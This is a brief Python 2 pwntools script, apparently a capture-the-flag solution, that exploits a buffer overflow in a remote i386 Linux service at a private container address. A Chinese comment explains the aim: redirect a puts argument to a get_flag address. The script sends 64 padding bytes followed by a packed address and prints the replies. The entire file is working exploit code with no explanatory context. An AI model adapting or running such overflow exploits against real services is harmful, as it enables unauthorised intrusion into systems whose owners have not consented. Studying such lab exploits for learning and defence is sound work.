#!/usr/bin/python
#coding:utf-8
#使用get_flag的地址覆盖掉put的参数地址
from pwn import *
context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)
v5=0x41348000
payload='A'*0x40+p32(v5)
print io.recv()
io.sendline(payload)
print io.recv()